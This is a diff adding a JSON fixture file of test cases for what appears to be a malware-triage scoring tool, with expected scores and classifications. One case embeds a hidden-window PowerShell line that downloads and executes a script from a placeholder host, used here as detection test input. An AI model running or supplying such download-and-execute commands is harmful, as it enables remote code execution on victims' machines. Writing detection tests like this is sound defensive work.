@@ -1,0 +1,115 @@
+{
+  "schema_version": "1.0",
+  "cases": [
+    {
+      "id": "clean-empty",
+      "description": "An empty report must remain clean and deterministic.",
+      "report": {
+        "nodes": [],
+        "iocs": {}
+      },
+      "expected": {
+        "score": 0,
+        "classification": "CLEAN",
+        "signal_codes": [],
+        "top_node_ids": []
+      }
+    },
+    {
+      "id": "low-risk-domain",
+      "description": "A domain alone creates a low-priority intelligence signal.",
+      "report": {
+        "nodes": [],
+        "iocs": {
+          "domains": [
+            "example.test"
+          ]
+        }
+      },
+      "expected": {
+        "score": 4,
+        "classification": "CLEAN",
+        "signal_codes": [
+          "network_domains"
+        ],
+        "top_node_ids": []
+      }
+    },
+    {
+      "id": "execution-url-deep",
+      "description": "Deep PowerShell content with a URL is suspicious and ranked first.",
+      "report": {
+        "nodes": [
+          {
+            "id": 7,
+            "depth": 4,
+            "entropy": 5.1,
+            "decode_score": 0.9,
+            "artifact_name": "decoded-script",
+            "method": "Base64",
+            "content_preview": "powershell -nop -w hidden; IEX(New-Object Net.WebClient).DownloadString('https://example.test/a')"
+          }
+        ],
+        "iocs": {
+          "urls": [
+            "https://example.test/a"
+          ]
+        }
+      },
+      "expected": {
+        "score": 36,
+        "classification": "SUSPICIOUS_OBJECT",
+        "signal_codes": [
+          "network_urls",
+          "deep_obfuscation",
+          "execution_context"
+        ],
+        "top_node_ids": [
+          7
+        ]
+      }
+    },
+    {
+      "id": "high-risk-detection",
+      "description": "A high detection, high entropy, embedded PE, and HIGH risk align.",
+      "report": {
+        "nodes": [
+          {
+            "id": 2,
+            "depth": 0,
+            "entropy": 7.8,
+            "decode_score": 0.2,
+            "artifact_name": "payload.exe",
+            "method": "source",
+            "content_preview": "MZ"
+          }
+        ],
+        "iocs": {},
+        "detections": [
+          {
+            "id": "fixture.high",
+            "name": "Fixture high",
+            "severity": "high"
+          }
+        ],
+        "risk_assessment": {
+          "risk_level": "HIGH",
+          "risk_score": 55
+        }
+      },
+      "expected": {
+        "score": 62,
+        "classification": "HIGH_RISK_PAYLOAD",
+        "signal_codes": [
+          "detection_rules",
+          "high_entropy",
+          "embedded_structure",
+          "risk_alignment"
+        ],
+        "top_node_ids": [
+          2
+        ]
+      }
+    }
+  ]
+}
